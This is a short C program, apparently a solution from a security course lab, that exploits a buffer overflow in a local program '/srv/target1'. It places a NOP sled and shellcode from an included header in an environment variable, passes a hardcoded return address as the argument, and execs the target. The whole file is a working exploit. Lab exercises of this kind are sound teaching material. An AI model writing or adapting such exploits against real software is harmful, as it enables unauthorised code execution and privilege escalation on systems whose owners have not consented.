#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target1"

int main(void)
{
  char *args[3];
  char *env[2];  

  char buf[32];
  memset(buf, 0x90, 32);
  strncpy(buf+10, shellcode, 22);
  
  uint32_t ret = 0xffffcfdc;

  env[0] = buf;  
  env[1] = NULL;

  args[0] = TARGET;
  args[1] = (char*)&ret;
  args[2] = NULL;
  
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}